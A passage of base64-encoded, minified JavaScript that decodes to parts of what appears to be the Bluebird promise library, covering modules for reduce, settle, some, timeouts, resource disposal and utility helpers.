gpLGQ9PT1mKXJldHVybiB0aGlzLl9yZWplY3QoZC5lKTt2YXIgeT1pKGQsdGhpcy5fcHJvbWlzZSk7aWYoeSBpbnN0YW5jZW9mIHQpe2lmKHk9eS5fdGFyZ2V0KCkseS5faXNQZW5kaW5nKCkpcmV0dXJuIGxbbV09NCx5Ll9wcm94eVByb21pc2VBcnJheSh0aGlzLG0pO2lmKCF5Ll9pc0Z1bGZpbGxlZCgpKXJldHVybiB0aGlzLl9yZWplY3QoeS5fcmVhc29uKCkpO2Q9eS5fdmFsdWUoKX10aGlzLl9yZWR1Y2luZ0luZGV4PW0rMSx0aGlzLl9hY2N1bT1kfWVsc2UgdGhpcy5fcmVkdWNpbmdJbmRleD1tKzE7dGhpcy5fcmVzb2x2ZSh1P2E6dGhpcy5fYWNjdW0pfX0sdC5wcm90b3R5cGUucmVkdWNlPWZ1bmN0aW9uKGUsdCl7cmV0dXJuIHUodGhpcyxlLHQsbnVsbCl9LHQucmVkdWNlPWZ1bmN0aW9uKGUsdCxuLHIpe3JldHVybiB1KGUsdCxuLHIpfX19LHsiLi9hc3luYy5qcyI6MiwiLi91dGlsLmpzIjozOH1dLDMxOltmdW5jdGlvbihlLGkscyl7InVzZSBzdHJpY3QiO3ZhciBvLGE9ZSgiLi91dGlsIiksdT1mdW5jdGlvbigpe3Rocm93IG5ldyBFcnJvcigiTm8gYXN5bmMgc2NoZWR1bGVyIGF2YWlsYWJsZVxuXG4gICAgU2VlIGh0dHA6Ly9nb28uZ2wvbTNPVFhrXG4iKX07aWYoYS5pc05vZGUmJiJ1bmRlZmluZWQiPT10eXBlb2YgTXV0YXRpb25PYnNlcnZlcil7dmFyIGM9bi5zZXRJbW1lZGlhdGUsbD10Lm5leHRUaWNrO289YS5pc1JlY2VudE5vZGU/ZnVuY3Rpb24oZSl7Yy5jYWxsKG4sZSl9OmZ1bmN0aW9uKGUpe2wuY2FsbCh0LGUpfX1lbHNlInVuZGVmaW5lZCI9PXR5cGVvZiBNdXRhdGlvbk9ic2VydmVyfHwidW5kZWZpbmVkIiE9dHlwZW9mIHdpbmRvdyYmd2luZG93Lm5hdmlnYXRvciYmd2luZG93Lm5hdmlnYXRvci5zdGFuZGFsb25lP289InVuZGVmaW5lZCIhPXR5cGVvZiByP2Z1bmN0aW9uKGUpe3IoZSl9OiJ1bmRlZmluZWQiIT10eXBlb2Ygc2V0VGltZW91dD9mdW5jdGlvbihlKXtzZXRUaW1lb3V0KGUsMCl9OnU6KG89ZnVuY3Rpb24oZSl7dmFyIHQ9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iiksbj1uZXcgTXV0YXRpb25PYnNlcnZlcihlKTtyZXR1cm4gbi5vYnNlcnZlKHQse2F0dHJpYnV0ZXM6ITB9KSxmdW5jdGlvbigpe3QuY2xhc3NMaXN0LnRvZ2dsZSgiZm9vIil9fSxvLmlzU3RhdGljPSEwKTtpLmV4cG9ydHM9b30seyIuL3V0aWwiOjM4fV0sMzI6W2Z1bmN0aW9uKGUsdCxuKXsidXNlIHN0cmljdCI7dC5leHBvcnRzPWZ1bmN0aW9uKHQsbil7ZnVuY3Rpb24gcihlKXt0aGlzLmNvbnN0cnVjdG9yJChlKX12YXIgaT10LlByb21pc2VJbnNwZWN0aW9uLHM9ZSgiLi91dGlsLmpzIik7cy5pbmhlcml0cyhyLG4pLHIucHJvdG90eXBlLl9wcm9taXNlUmVzb2x2ZWQ9ZnVuY3Rpb24oZSx0KXt0aGlzLl92YWx1ZXNbZV09dDt2YXIgbj0rK3RoaXMuX3RvdGFsUmVzb2x2ZWQ7bj49dGhpcy5fbGVuZ3RoJiZ0aGlzLl9yZXNvbHZlKHRoaXMuX3ZhbHVlcyl9LHIucHJvdG90eXBlLl9wcm9taXNlRnVsZmlsbGVkPWZ1bmN0aW9uKGUsdCl7dmFyIG49bmV3IGk7bi5fYml0RmllbGQ9MjY4NDM1NDU2LG4uX3NldHRsZWRWYWx1ZT1lLHRoaXMuX3Byb21pc2VSZXNvbHZlZCh0LG4pfSxyLnByb3RvdHlwZS5fcHJvbWlzZVJlamVjdGVkPWZ1bmN0aW9uKGUsdCl7dmFyIG49bmV3IGk7bi5fYml0RmllbGQ9MTM0MjE3NzI4LG4uX3NldHRsZWRWYWx1ZT1lLHRoaXMuX3Byb21pc2VSZXNvbHZlZCh0LG4pfSx0LnNldHRsZT1mdW5jdGlvbihlKXtyZXR1cm4gbmV3IHIoZSkucHJvbWlzZSgpfSx0LnByb3RvdHlwZS5zZXR0bGU9ZnVuY3Rpb24oKXtyZXR1cm4gbmV3IHIodGhpcykucHJvbWlzZSgpfX19LHsiLi91dGlsLmpzIjozOH1dLDMzOltmdW5jdGlvbihlLHQsbil7InVzZSBzdHJpY3QiO3QuZXhwb3J0cz1mdW5jdGlvbih0LG4scil7ZnVuY3Rpb24gaShlKXt0aGlzLmNvbnN0cnVjdG9yJChlKSx0aGlzLl9ob3dNYW55PTAsdGhpcy5fdW53cmFwPSExLHRoaXMuX2luaXRpYWxpemVkPSExfWZ1bmN0aW9uIHMoZSx0KXtpZigoMHx0KSE9PXR8fDA+dClyZXR1cm4gcigiZXhwZWN0aW5nIGEgcG9zaXRpdmUgaW50ZWdlclxuXG4gICAgU2VlIGh0dHA6Ly9nb28uZ2wvMXdBbUh4XG4iKTt2YXIgbj1uZXcgaShlKSxzPW4ucHJvbWlzZSgpO3JldHVybiBuLnNldEhvd01hbnkodCksbi5pbml0KCksc312YXIgbz1lKCIuL3V0aWwuanMiKSxhPWUoIi4vZXJyb3JzLmpzIikuUmFuZ2VFcnJvcix1PWUoIi4vZXJyb3JzLmpzIikuQWdncmVnYXRlRXJyb3IsYz1vLmlzQXJyYXk7by5pbmhlcml0cyhpLG4pLGkucHJvdG90eXBlLl9pbml0PWZ1bmN0aW9uKCl7aWYodGhpcy5faW5pdGlhbGl6ZWQpe2lmKDA9PT10aGlzLl9ob3dNYW55KXJldHVybiB2b2lkIHRoaXMuX3Jlc29sdmUoW10pO3RoaXMuX2luaXQkKHZvaWQgMCwtNSk7dmFyIGU9Yyh0aGlzLl92YWx1ZXMpOyF0aGlzLl9pc1Jlc29sdmVkKCkmJmUmJnRoaXMuX2hvd01hbnk+dGhpcy5fY2FuUG9zc2libHlGdWxmaWxsKCkmJnRoaXMuX3JlamVjdCh0aGlzLl9nZXRSYW5nZUVycm9yKHRoaXMubGVuZ3RoKCkpKX19LGkucHJvdG90eXBlLmluaXQ9ZnVuY3Rpb24oKXt0aGlzLl9pbml0aWFsaXplZD0hMCx0aGlzLl9pbml0KCl9LGkucHJvdG90eXBlLnNldFVud3JhcD1mdW5jdGlvbigpe3RoaXMuX3Vud3JhcD0hMH0saS5wcm90b3R5cGUuaG93TWFueT1mdW5jdGlvbigpe3JldHVybiB0aGlzLl9ob3dNYW55fSxpLnByb3RvdHlwZS5zZXRIb3dNYW55PWZ1bmN0aW9uKGUpe3RoaXMuX2hvd01hbnk9ZX0saS5wcm90b3R5cGUuX3Byb21pc2VGdWxmaWxsZWQ9ZnVuY3Rpb24oZSl7dGhpcy5fYWRkRnVsZmlsbGVkKGUpLHRoaXMuX2Z1bGZpbGxlZCgpPT09dGhpcy5ob3dNYW55KCkmJih0aGlzLl92YWx1ZXMubGVuZ3RoPXRoaXMuaG93TWFueSgpLDE9PT10aGlzLmhvd01hbnkoKSYmdGhpcy5fdW53cmFwP3RoaXMuX3Jlc29sdmUodGhpcy5fdmFsdWVzWzBdKTp0aGlzLl9yZXNvbHZlKHRoaXMuX3ZhbHVlcykpfSxpLnByb3RvdHlwZS5fcHJvbWlzZVJlamVjdGVkPWZ1bmN0aW9uKGUpe2lmKHRoaXMuX2FkZFJlamVjdGVkKGUpLHRoaXMuaG93TWFueSgpPnRoaXMuX2NhblBvc3NpYmx5RnVsZmlsbCgpKXtmb3IodmFyIHQ9bmV3IHUsbj10aGlzLmxlbmd0aCgpO248dGhpcy5fdmFsdWVzLmxlbmd0aDsrK24pdC5wdXNoKHRoaXMuX3ZhbHVlc1tuXSk7dGhpcy5fcmVqZWN0KHQpfX0saS5wcm90b3R5cGUuX2Z1bGZpbGxlZD1mdW5jdGlvbigpe3JldHVybiB0aGlzLl90b3RhbFJlc29sdmVkfSxpLnByb3RvdHlwZS5fcmVqZWN0ZWQ9ZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy5fdmFsdWVzLmxlbmd0aC10aGlzLmxlbmd0aCgpfSxpLnByb3RvdHlwZS5fYWRkUmVqZWN0ZWQ9ZnVuY3Rpb24oZSl7dGhpcy5fdmFsdWVzLnB1c2goZSl9LGkucHJvdG90eXBlLl9hZGRGdWxmaWxsZWQ9ZnVuY3Rpb24oZSl7dGhpcy5fdmFsdWVzW3RoaXMuX3RvdGFsUmVzb2x2ZWQrK109ZX0saS5wcm90b3R5cGUuX2NhblBvc3NpYmx5RnVsZmlsbD1mdW5jdGlvbigpe3JldHVybiB0aGlzLmxlbmd0aCgpLXRoaXMuX3JlamVjdGVkKCl9LGkucHJvdG90eXBlLl9nZXRSYW5nZUVycm9yPWZ1bmN0aW9uKGUpe3ZhciB0PSJJbnB1dCBhcnJheSBtdXN0IGNvbnRhaW4gYXQgbGVhc3QgIit0aGlzLl9ob3dNYW55KyIgaXRlbXMgYnV0IGNvbnRhaW5zIG9ubHkgIitlKyIgaXRlbXMiO3JldHVybiBuZXcgYSh0KX0saS5wcm90b3R5cGUuX3Jlc29sdmVFbXB0eUFycmF5PWZ1bmN0aW9uKCl7dGhpcy5fcmVqZWN0KHRoaXMuX2dldFJhbmdlRXJyb3IoMCkpfSx0LnNvbWU9ZnVuY3Rpb24oZSx0KXtyZXR1cm4gcyhlLHQpfSx0LnByb3RvdHlwZS5zb21lPWZ1bmN0aW9uKGUpe3JldHVybiBzKHRoaXMsZSl9LHQuX1NvbWVQcm9taXNlQXJyYXk9aX19LHsiLi9lcnJvcnMuanMiOjEzLCIuL3V0aWwuanMiOjM4fV0sMzQ6W2Z1bmN0aW9uKGUsdCxuKXsidXNlIHN0cmljdCI7dC5leHBvcnRzPWZ1bmN0aW9uKGUpe2Z1bmN0aW9uIHQoZSl7dm9pZCAwIT09ZT8oZT1lLl90YXJnZXQoKSx0aGlzLl9iaXRGaWVsZD1lLl9iaXRGaWVsZCx0aGlzLl9zZXR0bGVkVmFsdWU9ZS5fc2V0dGxlZFZhbHVlKToodGhpcy5fYml0RmllbGQ9MCx0aGlzLl9zZXR0bGVkVmFsdWU9dm9pZCAwKX10LnByb3RvdHlwZS52YWx1ZT1mdW5jdGlvbigpe2lmKCF0aGlzLmlzRnVsZmlsbGVkKCkpdGhyb3cgbmV3IFR5cGVFcnJvcigiY2Fubm90IGdldCBmdWxmaWxsbWVudCB2YWx1ZSBvZiBhIG5vbi1mdWxmaWxsZWQgcHJvbWlzZVxuXG4gICAgU2VlIGh0dHA6Ly9nb28uZ2wvaGMxRExqXG4iKTtyZXR1cm4gdGhpcy5fc2V0dGxlZFZhbHVlfSx0LnByb3RvdHlwZS5lcnJvcj10LnByb3RvdHlwZS5yZWFzb249ZnVuY3Rpb24oKXtpZighdGhpcy5pc1JlamVjdGVkKCkpdGhyb3cgbmV3IFR5cGVFcnJvcigiY2Fubm90IGdldCByZWplY3Rpb24gcmVhc29uIG9mIGEgbm9uLXJlamVjdGVkIHByb21pc2VcblxuICAgIFNlZSBodHRwOi8vZ29vLmdsL2hQdWl3QlxuIik7cmV0dXJuIHRoaXMuX3NldHRsZWRWYWx1ZX0sdC5wcm90b3R5cGUuaXNGdWxmaWxsZWQ9ZS5wcm90b3R5cGUuX2lzRnVsZmlsbGVkPWZ1bmN0aW9uKCl7cmV0dXJuKDI2ODQzNTQ1NiZ0aGlzLl9iaXRGaWVsZCk+MH0sdC5wcm90b3R5cGUuaXNSZWplY3RlZD1lLnByb3RvdHlwZS5faXNSZWplY3RlZD1mdW5jdGlvbigpe3JldHVybigxMzQyMTc3MjgmdGhpcy5fYml0RmllbGQpPjB9LHQucHJvdG90eXBlLmlzUGVuZGluZz1lLnByb3RvdHlwZS5faXNQZW5kaW5nPWZ1bmN0aW9uKCl7cmV0dXJuIDA9PT0oNDAyNjUzMTg0JnRoaXMuX2JpdEZpZWxkKX0sdC5wcm90b3R5cGUuaXNSZXNvbHZlZD1lLnByb3RvdHlwZS5faXNSZXNvbHZlZD1mdW5jdGlvbigpe3JldHVybig0MDI2NTMxODQmdGhpcy5fYml0RmllbGQpPjB9LGUucHJvdG90eXBlLmlzUGVuZGluZz1mdW5jdGlvbigpe3JldHVybiB0aGlzLl90YXJnZXQoKS5faXNQZW5kaW5nKCl9LGUucHJvdG90eXBlLmlzUmVqZWN0ZWQ9ZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy5fdGFyZ2V0KCkuX2lzUmVqZWN0ZWQoKX0sZS5wcm90b3R5cGUuaXNGdWxmaWxsZWQ9ZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy5fdGFyZ2V0KCkuX2lzRnVsZmlsbGVkKCl9LGUucHJvdG90eXBlLmlzUmVzb2x2ZWQ9ZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy5fdGFyZ2V0KCkuX2lzUmVzb2x2ZWQoKX0sZS5wcm90b3R5cGUuX3ZhbHVlPWZ1bmN0aW9uKCl7cmV0dXJuIHRoaXMuX3NldHRsZWRWYWx1ZX0sZS5wcm90b3R5cGUuX3JlYXNvbj1mdW5jdGlvbigpe3JldHVybiB0aGlzLl91bnNldFJlamVjdGlvbklzVW5oYW5kbGVkKCksdGhpcy5fc2V0dGxlZFZhbHVlfSxlLnByb3RvdHlwZS52YWx1ZT1mdW5jdGlvbigpe3ZhciBlPXRoaXMuX3RhcmdldCgpO2lmKCFlLmlzRnVsZmlsbGVkKCkpdGhyb3cgbmV3IFR5cGVFcnJvcigiY2Fubm90IGdldCBmdWxmaWxsbWVudCB2YWx1ZSBvZiBhIG5vbi1mdWxmaWxsZWQgcHJvbWlzZVxuXG4gICAgU2VlIGh0dHA6Ly9nb28uZ2wvaGMxRExqXG4iKTtyZXR1cm4gZS5fc2V0dGxlZFZhbHVlfSxlLnByb3RvdHlwZS5yZWFzb249ZnVuY3Rpb24oKXt2YXIgZT10aGlzLl90YXJnZXQoKTtpZighZS5pc1JlamVjdGVkKCkpdGhyb3cgbmV3IFR5cGVFcnJvcigiY2Fubm90IGdldCByZWplY3Rpb24gcmVhc29uIG9mIGEgbm9uLXJlamVjdGVkIHByb21pc2VcblxuICAgIFNlZSBodHRwOi8vZ29vLmdsL2hQdWl3QlxuIik7cmV0dXJuIGUuX3Vuc2V0UmVqZWN0aW9uSXNVbmhhbmRsZWQoKSxlLl9zZXR0bGVkVmFsdWV9LGUuUHJvbWlzZUluc3BlY3Rpb249dH19LHt9XSwzNTpbZnVuY3Rpb24oZSx0LG4peyJ1c2Ugc3RyaWN0Ijt0LmV4cG9ydHM9ZnVuY3Rpb24odCxuKXtmdW5jdGlvbiByKGUscil7aWYoYyhlKSl7aWYoZSBpbnN0YW5jZW9mIHQpcmV0dXJuIGU7aWYocyhlKSl7dmFyIGw9bmV3IHQobik7cmV0dXJuIGUuX3RoZW4obC5fZnVsZmlsbFVuY2hlY2tlZCxsLl9yZWplY3RVbmNoZWNrZWRDaGVja0Vycm9yLGwuX3Byb2dyZXNzVW5jaGVja2VkLGwsbnVsbCksbH12YXIgZD1hLnRyeUNhdGNoKGkpKGUpO2lmKGQ9PT11KXtyJiZyLl9wdXNoQ29udGV4dCgpO3ZhciBsPXQucmVqZWN0KGQuZSk7cmV0dXJuIHImJnIuX3BvcENvbnRleHQoKSxsfWlmKCJmdW5jdGlvbiI9PXR5cGVvZiBkKXJldHVybiBvKGUsZCxyKX1yZXR1cm4gZX1mdW5jdGlvbiBpKGUpe3JldHVybiBlLnRoZW59ZnVuY3Rpb24gcyhlKXtyZXR1cm4gbC5jYWxsKGUsIl9wcm9taXNlMCIpfWZ1bmN0aW9uIG8oZSxyLGkpe2Z1bmN0aW9uIHMoZSl7bCYmKGwuX3Jlc29sdmVDYWxsYmFjayhlKSxsPW51bGwpfWZ1bmN0aW9uIG8oZSl7bCYmKGwuX3JlamVjdENhbGxiYWNrKGUsaCwhMCksbD1udWxsKX1mdW5jdGlvbiBjKGUpe2wmJiJmdW5jdGlvbiI9PXR5cGVvZiBsLl9wcm9ncmVzcyYmbC5fcHJvZ3Jlc3MoZSl9dmFyIGw9bmV3IHQobiksZD1sO2kmJmkuX3B1c2hDb250ZXh0KCksbC5fY2FwdHVyZVN0YWNrVHJhY2UoKSxpJiZpLl9wb3BDb250ZXh0KCk7dmFyIGg9ITAsZj1hLnRyeUNhdGNoKHIpLmNhbGwoZSxzLG8sYyk7cmV0dXJuIGg9ITEsbCYmZj09PXUmJihsLl9yZWplY3RDYWxsYmFjayhmLmUsITAsITApLGw9bnVsbCksZH12YXIgYT1lKCIuL3V0aWwuanMiKSx1PWEuZXJyb3JPYmosYz1hLmlzT2JqZWN0LGw9e30uaGFzT3duUHJvcGVydHk7cmV0dXJuIHJ9fSx7Ii4vdXRpbC5qcyI6Mzh9XSwzNjpbZnVuY3Rpb24oZSx0LG4peyJ1c2Ugc3RyaWN0Ijt0LmV4cG9ydHM9ZnVuY3Rpb24odCxuKXtmdW5jdGlvbiByKGUpe3ZhciB0PXRoaXM7cmV0dXJuIHQgaW5zdGFuY2VvZiBOdW1iZXImJih0PSt0KSxjbGVhclRpbWVvdXQodCksZX1mdW5jdGlvbiBpKGUpe3ZhciB0PXRoaXM7dGhyb3cgdCBpbnN0YW5jZW9mIE51bWJlciYmKHQ9K3QpLGNsZWFyVGltZW91dCh0KSxlfXZhciBzPWUoIi4vdXRpbC5qcyIpLG89dC5UaW1lb3V0RXJyb3IsYT1mdW5jdGlvbihlLHQpe2lmKGUuaXNQZW5kaW5nKCkpe3ZhciBuOyFzLmlzUHJpbWl0aXZlKHQpJiZ0IGluc3RhbmNlb2YgRXJyb3I/bj10Oigic3RyaW5nIiE9dHlwZW9mIHQmJih0PSJvcGVyYXRpb24gdGltZWQgb3V0Iiksbj1uZXcgbyh0KSkscy5tYXJrQXNPcmlnaW5hdGluZ0Zyb21SZWplY3Rpb24obiksZS5fYXR0YWNoRXh0cmFUcmFjZShuKSxlLl9jYW5jZWwobil9fSx1PWZ1bmN0aW9uKGUpe3JldHVybiBjKCt0aGlzKS50aGVuUmV0dXJuKGUpfSxjPXQuZGVsYXk9ZnVuY3Rpb24oZSxyKXtpZih2b2lkIDA9PT1yKXtyPWUsZT12b2lkIDA7dmFyIGk9bmV3IHQobik7cmV0dXJuIHNldFRpbWVvdXQoZnVuY3Rpb24oKXtpLl9mdWxmaWxsKCl9LHIpLGl9cmV0dXJuIHI9K3IsdC5yZXNvbHZlKGUpLl90aGVuKHUsbnVsbCxudWxsLHIsdm9pZCAwKX07dC5wcm90b3R5cGUuZGVsYXk9ZnVuY3Rpb24oZSl7cmV0dXJuIGModGhpcyxlKX0sdC5wcm90b3R5cGUudGltZW91dD1mdW5jdGlvbihlLHQpe2U9K2U7dmFyIG49dGhpcy50aGVuKCkuY2FuY2VsbGFibGUoKTtuLl9jYW5jZWxsYXRpb25QYXJlbnQ9dGhpczt2YXIgcz1zZXRUaW1lb3V0KGZ1bmN0aW9uKCl7YShuLHQpfSxlKTtyZXR1cm4gbi5fdGhlbihyLGksdm9pZCAwLHMsdm9pZCAwKX19fSx7Ii4vdXRpbC5qcyI6Mzh9XSwzNzpbZnVuY3Rpb24oZSx0LG4peyJ1c2Ugc3RyaWN0Ijt0LmV4cG9ydHM9ZnVuY3Rpb24odCxuLHIsaSl7ZnVuY3Rpb24gcyhlKXtmb3IodmFyIG49ZS5sZW5ndGgscj0wO24+cjsrK3Ipe3ZhciBpPWVbcl07aWYoaS5pc1JlamVjdGVkKCkpcmV0dXJuIHQucmVqZWN0KGkuZXJyb3IoKSk7ZVtyXT1pLl9zZXR0bGVkVmFsdWV9cmV0dXJuIGV9ZnVuY3Rpb24gbyhlKXtzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7dGhyb3cgZX0sMCl9ZnVuY3Rpb24gYShlKXt2YXIgdD1yKGUpO3JldHVybiB0IT09ZSYmImZ1bmN0aW9uIj09dHlwZW9mIGUuX2lzRGlzcG9zYWJsZSYmImZ1bmN0aW9uIj09dHlwZW9mIGUuX2dldERpc3Bvc2VyJiZlLl9pc0Rpc3Bvc2FibGUoKSYmdC5fc2V0RGlzcG9zYWJsZShlLl9nZXREaXNwb3NlcigpKSx0fWZ1bmN0aW9uIHUoZSxuKXtmdW5jdGlvbiBpKCl7aWYocz49dSlyZXR1cm4gYy5yZXNvbHZlKCk7dmFyIGw9YShlW3MrK10pO2lmKGwgaW5zdGFuY2VvZiB0JiZsLl9pc0Rpc3Bvc2FibGUoKSl7dHJ5e2w9cihsLl9nZXREaXNwb3NlcigpLnRyeURpc3Bvc2UobiksZS5wcm9taXNlKX1jYXRjaChkKXtyZXR1cm4gbyhkKX1pZihsIGluc3RhbmNlb2YgdClyZXR1cm4gbC5fdGhlbihpLG8sbnVsbCxudWxsLG51bGwpfWkoKX12YXIgcz0wLHU9ZS5sZW5ndGgsYz10LmRlZmVyKCk7cmV0dXJuIGkoKSxjLnByb21pc2V9ZnVuY3Rpb24gYyhlKXt2YXIgdD1uZXcgbTtyZXR1cm4gdC5fc2V0dGxlZFZhbHVlPWUsdC5fYml0RmllbGQ9MjY4NDM1NDU2LHUodGhpcyx0KS50aGVuUmV0dXJuKGUpfWZ1bmN0aW9uIGwoZSl7dmFyIHQ9bmV3IG07cmV0dXJuIHQuX3NldHRsZWRWYWx1ZT1lLHQuX2JpdEZpZWxkPTEzNDIxNzcyOCx1KHRoaXMsdCkudGhlblRocm93KGUpfWZ1bmN0aW9uIGQoZSx0LG4pe3RoaXMuX2RhdGE9ZSx0aGlzLl9wcm9taXNlPXQsdGhpcy5fY29udGV4dD1ufWZ1bmN0aW9uIGgoZSx0LG4pe3RoaXMuY29uc3RydWN0b3IkKGUsdCxuKX1mdW5jdGlvbiBmKGUpe3JldHVybiBkLmlzRGlzcG9zZXIoZSk/KHRoaXMucmVzb3VyY2VzW3RoaXMuaW5kZXhdLl9zZXREaXNwb3NhYmxlKGUpLGUucHJvbWlzZSgpKTplfXZhciBwPWUoIi4vZXJyb3JzLmpzIikuVHlwZUVycm9yLF89ZSgiLi91dGlsLmpzIikuaW5oZXJpdHMsbT10LlByb21pc2VJbnNwZWN0aW9uO2QucHJvdG90eXBlLmRhdGE9ZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy5fZGF0YX0sZC5wcm90b3R5cGUucHJvbWlzZT1mdW5jdGlvbigpe3JldHVybiB0aGlzLl9wcm9taXNlfSxkLnByb3RvdHlwZS5yZXNvdXJjZT1mdW5jdGlvbigpe3JldHVybiB0aGlzLnByb21pc2UoKS5pc0Z1bGZpbGxlZCgpP3RoaXMucHJvbWlzZSgpLnZhbHVlKCk6bnVsbH0sZC5wcm90b3R5cGUudHJ5RGlzcG9zZT1mdW5jdGlvbihlKXt2YXIgdD10aGlzLnJlc291cmNlKCksbj10aGlzLl9jb250ZXh0O3ZvaWQgMCE9PW4mJm4uX3B1c2hDb250ZXh0KCk7dmFyIHI9bnVsbCE9PXQ/dGhpcy5kb0Rpc3Bvc2UodCxlKTpudWxsO3JldHVybiB2b2lkIDAhPT1uJiZuLl9wb3BDb250ZXh0KCksdGhpcy5fcHJvbWlzZS5fdW5zZXREaXNwb3NhYmxlKCksdGhpcy5fZGF0YT1udWxsLHJ9LGQuaXNEaXNwb3Nlcj1mdW5jdGlvbihlKXtyZXR1cm4gbnVsbCE9ZSYmImZ1bmN0aW9uIj09dHlwZW9mIGUucmVzb3VyY2UmJiJmdW5jdGlvbiI9PXR5cGVvZiBlLnRyeURpc3Bvc2V9LF8oaCxkKSxoLnByb3RvdHlwZS5kb0Rpc3Bvc2U9ZnVuY3Rpb24oZSx0KXt2YXIgbj10aGlzLmRhdGEoKTtyZXR1cm4gbi5jYWxsKGUsZSx0KX0sdC51c2luZz1mdW5jdGlvbigpe3ZhciBlPWFyZ3VtZW50cy5sZW5ndGg7aWYoMj5lKXJldHVybiBuKCJ5b3UgbXVzdCBwYXNzIGF0IGxlYXN0IDIgYXJndW1lbnRzIHRvIFByb21pc2UudXNpbmciKTt2YXIgaT1hcmd1bWVudHNbZS0xXTtpZigiZnVuY3Rpb24iIT10eXBlb2YgaSlyZXR1cm4gbigiZm4gbXVzdCBiZSBhIGZ1bmN0aW9uXG5cbiAgICBTZWUgaHR0cDovL2dvby5nbC85MTZsSkpcbiIpO3ZhciBvLGE9ITA7Mj09PWUmJkFycmF5LmlzQXJyYXkoYXJndW1lbnRzWzBdKT8obz1hcmd1bWVudHNbMF0sZT1vLmxlbmd0aCxhPSExKToobz1hcmd1bWVudHMsZS0tKTtmb3IodmFyIHU9bmV3IEFycmF5KGUpLGg9MDtlPmg7KytoKXt2YXIgcD1vW2hdO2lmKGQuaXNEaXNwb3NlcihwKSl7dmFyIF89cDtwPXAucHJvbWlzZSgpLHAuX3NldERpc3Bvc2FibGUoXyl9ZWxzZXt2YXIgbT1yKHApO20gaW5zdGFuY2VvZiB0JiYocD1tLl90aGVuKGYsbnVsbCxudWxsLHtyZXNvdXJjZXM6dSxpbmRleDpofSx2b2lkIDApKX11W2hdPXB9dmFyIHk9dC5zZXR0bGUodSkudGhlbihzKS50aGVuKGZ1bmN0aW9uKGUpe3kuX3B1c2hDb250ZXh0KCk7dmFyIHQ7dHJ5e3Q9YT9pLmFwcGx5KHZvaWQgMCxlKTppLmNhbGwodm9pZCAwLGUpfWZpbmFsbHl7DQp5Ll9wb3BDb250ZXh0KCl9cmV0dXJuIHR9KS5fdGhlbihjLGwsdm9pZCAwLHUsdm9pZCAwKTtyZXR1cm4gdS5wcm9taXNlPXkseX0sdC5wcm90b3R5cGUuX3NldERpc3Bvc2FibGU9ZnVuY3Rpb24oZSl7dGhpcy5fYml0RmllbGQ9MjYyMTQ0fHRoaXMuX2JpdEZpZWxkLHRoaXMuX2Rpc3Bvc2VyPWV9LHQucHJvdG90eXBlLl9pc0Rpc3Bvc2FibGU9ZnVuY3Rpb24oKXtyZXR1cm4oMjYyMTQ0JnRoaXMuX2JpdEZpZWxkKT4wfSx0LnByb3RvdHlwZS5fZ2V0RGlzcG9zZXI9ZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy5fZGlzcG9zZXJ9LHQucHJvdG90eXBlLl91bnNldERpc3Bvc2FibGU9ZnVuY3Rpb24oKXt0aGlzLl9iaXRGaWVsZD0tMjYyMTQ1JnRoaXMuX2JpdEZpZWxkLHRoaXMuX2Rpc3Bvc2VyPXZvaWQgMH0sdC5wcm90b3R5cGUuZGlzcG9zZXI9ZnVuY3Rpb24oZSl7aWYoImZ1bmN0aW9uIj09dHlwZW9mIGUpcmV0dXJuIG5ldyBoKGUsdGhpcyxpKCkpO3Rocm93IG5ldyBwfX19LHsiLi9lcnJvcnMuanMiOjEzLCIuL3V0aWwuanMiOjM4fV0sMzg6W2Z1bmN0aW9uKGUsbixyKXsidXNlIHN0cmljdCI7ZnVuY3Rpb24gaSgpe3RyeXt2YXIgZT1EO3JldHVybiBEPW51bGwsZS5hcHBseSh0aGlzLGFyZ3VtZW50cyl9Y2F0Y2godCl7cmV0dXJuIFkuZT10LFl9fWZ1bmN0aW9uIHMoZSl7cmV0dXJuIEQ9ZSxpfWZ1bmN0aW9uIG8oZSl7cmV0dXJuIG51bGw9PWV8fGU9PT0hMHx8ZT09PSExfHwic3RyaW5nIj09dHlwZW9mIGV8fCJudW1iZXIiPT10eXBlb2YgZX1mdW5jdGlvbiBhKGUpe3JldHVybiFvKGUpfWZ1bmN0aW9uIHUoZSl7cmV0dXJuIG8oZSk/bmV3IEVycm9yKHkoZSkpOmV9ZnVuY3Rpb24gYyhlLHQpe3ZhciBuLHI9ZS5sZW5ndGgsaT1uZXcgQXJyYXkocisxKTtmb3Iobj0wO3I+bjsrK24paVtuXT1lW25dO3JldHVybiBpW25dPXQsaX1mdW5jdGlvbiBsKGUsdCxuKXtpZighay5pc0VTNSlyZXR1cm57fS5oYXNPd25Qcm9wZXJ0eS5jYWxsKGUsdCk/ZVt0XTp2b2lkIDA7dmFyIHI9T2JqZWN0LmdldE93blByb3BlcnR5RGVzY3JpcHRvcihlLHQpO3JldHVybiBudWxsIT1yP251bGw9PXIuZ2V0JiZudWxsPT1yLnNldD9yLnZhbHVlOm46dm9pZCAwfWZ1bmN0aW9uIGQoZSx0LG4pe2lmKG8oZSkpcmV0dXJuIGU7dmFyIHI9e3ZhbHVlOm4sY29uZmlndXJhYmxlOiEwLGVudW1lcmFibGU6ITEsd3JpdGFibGU6ITB9O3JldHVybiBrLmRlZmluZVByb3BlcnR5KGUsdCxyKSxlfWZ1bmN0aW9uIGgoZSl7dGhyb3cgZX1mdW5jdGlvbiBmKGUpe3RyeXtpZigiZnVuY3Rpb24iPT10eXBlb2YgZSl7dmFyIHQ9ay5uYW1lcyhlLnByb3RvdHlwZSksbj1rLmlzRVM1JiZ0Lmxlbmd0aD4xLHI9dC5sZW5ndGg+MCYmISgxPT09dC5sZW5ndGgmJiJjb25zdHJ1Y3RvciI9PT10WzBdKSxpPWoudGVzdChlKyIiKSYmay5uYW1lcyhlKS5sZW5ndGg+MDtpZihufHxyfHxpKXJldHVybiEwfXJldHVybiExfWNhdGNoKHMpe3JldHVybiExfX1mdW5jdGlvbiBwKGUpe2Z1bmN0aW9uIHQoKXt9dC5wcm90b3R5cGU9ZTtmb3IodmFyIG49ODtuLS07KW5ldyB0O3JldHVybiBlfWZ1bmN0aW9uIF8oZSl7cmV0dXJuIEgudGVzdChl